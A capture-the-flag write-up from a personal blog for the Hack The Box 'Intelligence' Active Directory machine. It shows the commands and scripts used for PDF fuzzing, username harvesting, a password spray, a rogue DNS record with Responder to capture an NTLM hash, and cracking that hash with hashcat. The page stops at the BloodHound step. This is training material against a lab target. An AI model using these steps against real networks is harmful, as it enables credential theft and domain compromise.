@@ -1,0 +1,873 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="keywords" content="['Markdown', 'Example']">
+      
+      
+        <meta name="author" content="['@kf0k']">
+      
+      
+      <link rel="icon" href="../../assets/logo.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-7.3.4">
+    
+    
+      
+        <title>Intelligence Write-up - Blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.db9e7362.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.3f5d1f46.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#000000">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font-family:"Roboto";--md-code-font-family:"Roboto Mono"}</style>
+      
+    
+    
+    
+    
+      
+
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="black" data-md-color-accent="">
+  
+    
+    <script>function __prefix(e){return new URL("../..",location).pathname+"."+e}function __get(e,t=localStorage){return JSON.parse(t.getItem(__prefix(e)))}</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#overview" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Blog" class="md-header__button md-logo" aria-label="Blog" data-md-component="logo">
+      
+  <img src="../../assets/logo.png" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Intelligence Write-up
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Blog" class="md-nav__button md-logo" aria-label="Blog" data-md-component="logo">
+      
+  <img src="../../assets/logo.png" alt="logo">
+
+    </a>
+    Blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Posts
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" type="checkbox" id="__nav_2" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          Posts
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Posts" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          Posts
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Posts/Create_Pentest_Report_using_Markdown/" class="md-nav__link">
+        Creating a Professional Penetration Test Report using Markdown and Pandoc
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+    
+  
+  
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" type="checkbox" id="__nav_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          Writeups
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Writeups" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          Writeups
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+    
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          Intelligence Write-up
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        Intelligence Write-up
+      </a>
+      
+        
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#machine-info" class="md-nav__link">
+    Machine Info
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#machine-info" class="md-nav__link">
+    Machine Info
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                <h1 id="overview">Overview</h1>
+<p><img alt="" src="../assets/image-20210705163025884.png" /></p>
+<p>Intelligence was my best HTB Machine yet, where it was realist environment and real life scenario. Intelligence was based in Active Directory Penetration Test and mostly depeneds in enumeration to found a way into the Domain Admin. <strong><a href="https://www.hackthebox.eu/home/users/profile/178681">My HTB profile link</a></strong></p>
+<h2 id="machine-info">Machine Info</h2>
+<p><img alt="" src="/home/kali/.config/Typora/typora-user-images/image-20210704094536818.png" /></p>
+<table>
+<thead>
+<tr>
+<th>Operating System</th>
+<th>Difficulty</th>
+<th>IP</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Windows</td>
+<td>Medium</td>
+<td>10.10.10.248</td>
+</tr>
+</tbody>
+</table>
+<h1 id="walkthrough">Walkthrough</h1>
+<h2 id="recon">Recon</h2>
+<h3 id="nmap">nmap</h3>
+<pre><code class="language-bash">PORT     STATE SERVICE       REASON  VERSION
+53/tcp   open  domain        syn-ack Simple DNS Plus
+80/tcp   open  http          syn-ack Microsoft IIS httpd 10.0
+|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Intelligence
+88/tcp   open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2021-07-04 20:46:20Z)
+135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
+445/tcp  open  microsoft-ds? syn-ack
+464/tcp  open  kpasswd5?     syn-ack
+593/tcp  open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
+3268/tcp open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+| Issuer: commonName=intelligence-DC-CA/domainComponent=intelligence
+3269/tcp open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=dc.intelligence.htb
+| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+</code></pre>
+<p>By looking into <code>nmap</code> scanning results, we will discover that the host is Domain Controller. Furthermore, port 80, 139, 445 are opened so we can enumerate web service and SMB shared folders. </p>
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p>During inspecting the web application, we will identify a new directory <code>/documents</code> that contains multiple PDF files. Two documents can be identify if we hover over download button: <code>http://10.10.10.248/documents/2020-01-01-upload.pdf</code> and <code>http://10.10.10.248/documents/2020-12-15-upload.pdf</code> </p>
+<p><img alt="" src="../assets/image-20210705164909171.png" /></p>
+<p><img alt="" src="../assets/image-20210705165452811.png" /></p>
+<p>After downloading the PDF documents, I used <code>exiftool</code> to check the creator of document in order to enumerate domain users. </p>
+<p><img alt="" src="../assets/image-20210705171025067.png" /></p>
+<p>From the pattern of the PDF files name I identified that the naming format is using <code>2020-##-##-upload.pdf</code> where is <code>##</code> is two digits. </p>
+<h3 id="fuzzing-documents">Fuzzing Documents</h3>
+<h4 id="collecting-domain-users">Collecting Domain Users</h4>
+<p>With the knowledge of this, made a list of 4 digits to run <code>wfuzz</code> in order to find valid PDF documents. </p>
+<ol>
+<li>I used the following command to create a sequence of 4 digits and insert <code>-</code> in the middle: </li>
+</ol>
+<p><code>bash
+   seq -w 0000 9999 | sed 's/../&amp;-/' &gt; nums</code></p>
+<ol>
+<li>Then, I run <code>wfuzz</code> to fuzz target URL with my created list of 4 digits: </li>
+</ol>
+<p><code>bash
+   wfuzz -c -z file,nums -f output.json,json --sc 200 http://10.10.10.248/documents/2020-FUZZ-upload.pdf</code></p>
+<p><img alt="" src="../assets/image-20210704221518718.png" /></p>
+<ol>
+<li>After that, collected all valid documents and I made a Python script to auto download the valid documents:</li>
+</ol>
+<pre><code class="language-python">   import requests
+   from multiprocessing.pool import ThreadPool
+
+   def download_url(url):
+     print(&quot;downloading: &quot;,url)
+
+     file_name_start_pos = url.rfind(&quot;/&quot;) + 1
+     file_name = url[file_name_start_pos:]
+
+     r = requests.get(url, stream=True)
+     if r.status_code == requests.codes.ok:
+       with open(file_name, 'wb') as f:
+         for data in r:
+           f.write(data)
+     return url
+
+
+   urls = [&quot;http://10.10.10.248/documents/2020-01-04-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-01-02-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-01-01-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-01-10-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-01-22-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-01-30-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-01-25-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-01-23-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-01-20-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-02-11-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-02-28-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-02-24-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-02-23-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-02-17-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-03-04-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-03-05-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-03-12-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-03-21-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-03-17-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-03-13-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-04-04-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-04-02-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-04-23-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-04-15-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-05-07-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-05-03-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-05-01-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-05-24-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-05-29-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-05-21-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-05-20-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-05-17-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-05-11-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-21-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-30-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-28-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-25-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-26-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-22-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-15-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-14-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-12-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-08-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-04-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-07-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-03-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-06-02-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-07-08-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-07-06-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-07-02-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-07-24-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-07-20-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-08-20-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-08-19-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-08-09-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-08-01-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-08-03-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-09-05-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-09-04-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-09-02-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-09-06-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-09-29-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-09-27-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-09-22-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-09-16-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-09-11-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-09-13-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-09-30-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-10-05-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-10-19-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-11-10-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-11-06-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-11-03-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-11-01-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-11-13-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-11-11-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-11-30-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-11-24-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-12-15-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-12-10-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-12-30-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-12-28-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-12-24-upload.pdf&quot;,
+           &quot;http://10.10.10.248/documents/2020-12-20-upload.pdf&quot;
+           ]
+
+   results = ThreadPool(5).imap_unordered(download_url, urls)
+   for r in results:
+       print(r)
+</code></pre>
+<ol>
+<li>Finally I collected all the users from downloaded documents using <code>exiftool</code>. </li>
+</ol>
+<pre><code class="language-bash">   exiftool 2020-01-01-upload.pdf | grep &quot;Creator&quot; | cut -f 2 -d &quot;:&quot; | cut -f 2 -d &quot; &quot; &gt; users.txt
+
+   cat users.txt
+   William.Lee
+   Scott.Scott
+   Jason.Wright
+   Veronica.Patel
+   Jennifer.Thomas
+   Danny.Matthews
+   David.Reed
+   Stephanie.Young
+   Daniel.Shelton
+   ...
+</code></pre>
+<h4 id="obtain-the-password">Obtain the Password</h4>
+<p>Let's search for the password from documents. Since we have many PDF documents I created another Python script to automate the process of extracting the text from the all downloaded PDF documents: </p>
+<pre><code class="language-python">#!/usr/bin/python3
+import fitz
+
+files = [&quot;2020-01-04-upload.pdf&quot;,
+        &quot;2020-01-02-upload.pdf&quot;,
+        &quot;2020-01-01-upload.pdf&quot;,
+        &quot;2020-01-10-upload.pdf&quot;,
+        &quot;2020-01-22-upload.pdf&quot;,
+        &quot;2020-01-30-upload.pdf&quot;,
+        &quot;2020-01-25-upload.pdf&quot;,
+        &quot;2020-01-23-upload.pdf&quot;,
+        &quot;2020-01-20-upload.pdf&quot;,
+        &quot;2020-02-11-upload.pdf&quot;,
+        &quot;2020-02-28-upload.pdf&quot;,
+        &quot;2020-02-24-upload.pdf&quot;,
+        &quot;2020-02-23-upload.pdf&quot;,
+        &quot;2020-02-17-upload.pdf&quot;,
+        &quot;2020-03-04-upload.pdf&quot;,
+        &quot;2020-03-05-upload.pdf&quot;,
+        &quot;2020-03-12-upload.pdf&quot;,
+        &quot;2020-03-21-upload.pdf&quot;,
+        &quot;2020-03-17-upload.pdf&quot;,
+        &quot;2020-03-13-upload.pdf&quot;,
+        &quot;2020-04-04-upload.pdf&quot;,
+        &quot;2020-04-02-upload.pdf&quot;,
+        &quot;2020-04-23-upload.pdf&quot;,
+        &quot;2020-04-15-upload.pdf&quot;,
+        &quot;2020-05-07-upload.pdf&quot;,
+        &quot;2020-05-03-upload.pdf&quot;,
+        &quot;2020-05-01-upload.pdf&quot;,
+        &quot;2020-05-24-upload.pdf&quot;,
+        &quot;2020-05-29-upload.pdf&quot;,
+        &quot;2020-05-21-upload.pdf&quot;,
+        &quot;2020-05-20-upload.pdf&quot;,
+        &quot;2020-05-17-upload.pdf&quot;,
+        &quot;2020-05-11-upload.pdf&quot;,
+        &quot;2020-06-21-upload.pdf&quot;,
+        &quot;2020-06-30-upload.pdf&quot;,
+        &quot;2020-06-28-upload.pdf&quot;,
+        &quot;2020-06-25-upload.pdf&quot;,
+        &quot;2020-06-26-upload.pdf&quot;,
+        &quot;2020-06-22-upload.pdf&quot;,
+        &quot;2020-06-15-upload.pdf&quot;,
+        &quot;2020-06-14-upload.pdf&quot;,
+        &quot;2020-06-12-upload.pdf&quot;,
+        &quot;2020-06-08-upload.pdf&quot;,
+        &quot;2020-06-04-upload.pdf&quot;,
+        &quot;2020-06-07-upload.pdf&quot;,
+        &quot;2020-06-03-upload.pdf&quot;,
+        &quot;2020-06-02-upload.pdf&quot;,
+        &quot;2020-07-08-upload.pdf&quot;,
+        &quot;2020-07-06-upload.pdf&quot;,
+        &quot;2020-07-02-upload.pdf&quot;,
+        &quot;2020-07-24-upload.pdf&quot;,
+        &quot;2020-07-20-upload.pdf&quot;,
+        &quot;2020-08-20-upload.pdf&quot;,
+        &quot;2020-08-19-upload.pdf&quot;,
+        &quot;2020-08-09-upload.pdf&quot;,
+        &quot;2020-08-01-upload.pdf&quot;,
+        &quot;2020-08-03-upload.pdf&quot;,
+        &quot;2020-09-05-upload.pdf&quot;,
+        &quot;2020-09-04-upload.pdf&quot;,
+        &quot;2020-09-02-upload.pdf&quot;,
+        &quot;2020-09-06-upload.pdf&quot;,
+        &quot;2020-09-29-upload.pdf&quot;,
+        &quot;2020-09-27-upload.pdf&quot;,
+        &quot;2020-09-22-upload.pdf&quot;,
+        &quot;2020-09-16-upload.pdf&quot;,
+        &quot;2020-09-11-upload.pdf&quot;,
+        &quot;2020-09-13-upload.pdf&quot;,
+        &quot;2020-09-30-upload.pdf&quot;,
+        &quot;2020-10-05-upload.pdf&quot;,
+        &quot;2020-10-19-upload.pdf&quot;,
+        &quot;2020-11-10-upload.pdf&quot;,
+        &quot;2020-11-06-upload.pdf&quot;,
+        &quot;2020-11-03-upload.pdf&quot;,
+        &quot;2020-11-01-upload.pdf&quot;,
+        &quot;2020-11-13-upload.pdf&quot;,
+        &quot;2020-11-11-upload.pdf&quot;,
+        &quot;2020-11-30-upload.pdf&quot;,
+        &quot;2020-11-24-upload.pdf&quot;,
+        &quot;2020-12-15-upload.pdf&quot;,
+        &quot;2020-12-10-upload.pdf&quot;,
+        &quot;2020-12-30-upload.pdf&quot;,
+        &quot;2020-12-28-upload.pdf&quot;,
+        &quot;2020-12-24-upload.pdf&quot;,
+        &quot;2020-12-20-upload.pdf&quot;
+        ]
+
+for i in files: 
+        with fitz.open(i) as doc:
+            text = &quot;&quot;
+            for page in doc: 
+                text += page.getText()
+
+        print(text)
+</code></pre>
+<p>By running the script and go through the output we will identify the password which is <code>NewIntelligenceCorpUser9876</code></p>
+<p><img alt="" src="../assets/image-20210705125941161.png" /></p>
+<h2 id="password-spray">Password Spray</h2>
+<p>With the obtained password, now we can run password spray against the collected domain users: </p>
+<pre><code class="language-bash">crackmapexec smb 10.10.10.248 -u users.txt -p &quot;NewIntelligenceCorpUser9876&quot;
+</code></pre>
+<p><img alt="" src="../assets/image-20210704221856446.png" /></p>
+<p>We obtained user <code>tiffany.molina</code> credentials. Now we can get <code>user.txt</code> from users shared file using <code>smbclient</code>. </p>
+<pre><code class="language-bash">smbclient \\\\10.10.10.248\\Users -U 'workgroup\Tiffany.Molina'
+</code></pre>
+<p><img alt="" src="../assets/image-20210704222025924.png" /></p>
+<h2 id="pivot-to-tedgraves">Pivot to <code>Ted.Graves</code></h2>
+<h3 id="smb-shares-enumeration">SMB Shares Enumeration</h3>
+<p>The domain user <code>Tiffany.Molina</code> have also access to <code>IT</code> shared folder, let's inspect it. </p>
+<pre><code class="language-bash">Ξ Intelligence/dump → smbclient \\\\10.10.10.248\\IT -U 'workgroup\Tiffany.Molina' 
+Enter WORKGROUP\Tiffany.Molina's password: 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Sun Apr 18 20:50:55 2021
+  ..                                  D        0  Sun Apr 18 20:50:55 2021
+  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021
+
+        3770367 blocks of size 4096. 1362603 blocks available
+smb: \&gt; get downdetector.ps1 
+</code></pre>
+<p>I found Powershell script inside <code>IT</code> shared folder. </p>
+<p>By inspecting the Powershell script, I identified that the script runs every 5 minutes, it makes a request to web server that contains <code>web*</code>. </p>
+<pre><code class="language-powershell"># Check web server status. Scheduled to run every 5min
+Import-Module ActiveDirectory 
+foreach($record in Get-ChildItem &quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot; | Where-Object Name -like &quot;web*&quot;)  {
+try {
+$request = Invoke-WebRequest -Uri &quot;http://$($record.Name)&quot; -UseDefaultCredentials
+if(.StatusCode -ne 200) {
+Send-MailMessage -From 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -To 'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;' -Subject &quot;Host: $($record.Name) is down&quot;
+}
+} catch {}
+}
+</code></pre>
+<h4 id="obtain-tedgraves-ntlm-hash">Obtain <code>Ted.Graves</code> NTLM Hash</h4>
+<p>We can abuse this by adding a DNS record using <code>dnstool</code> and run <code>Responder</code> to receive the NTLM hash of the user <code>ted.graves</code>. </p>
+<blockquote>
+<p><code>dnstool</code> can be found <a href="https://github.com/dirkjanm/krbrelayx">here</a></p>
+</blockquote>
+<pre><code class="language-bash">python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 --action add -r websomething.intelligence.htb -d 10.10.14.x 10.10.10.248
+</code></pre>
+<p><img alt="" src="../assets/image-20210704221727841.png" /></p>
+<p>Then run <code>responder</code> to receive the NTLM hash</p>
+<pre><code class="language-bash">sudo responder -I tun0
+</code></pre>
+<p><img alt="" src="../assets/image-20210704221644619.png" /></p>
+<h4 id="obtain-tedgraves-password">Obtain <code>Ted.Graves</code> Password</h4>
+<p>Now we found the NTLM hash of the user <code>ted.graves</code>, we can use <code>hashcat</code> to crack it: </p>
+<pre><code class="language-bash">hashcat -a 0 -m 5600 ted.graves-ntlm  /usr/share/wordlists/rockyou.txt --force
+</code></pre>
+<p><img alt="" src="../assets/image-20210705174539364.png" /></p>
+<h3 id="enumerate-the-domain-controller">Enumerate the Domain Controller</h3>
+<h4 id="running-bloodhound">Running BloodHound</h4>
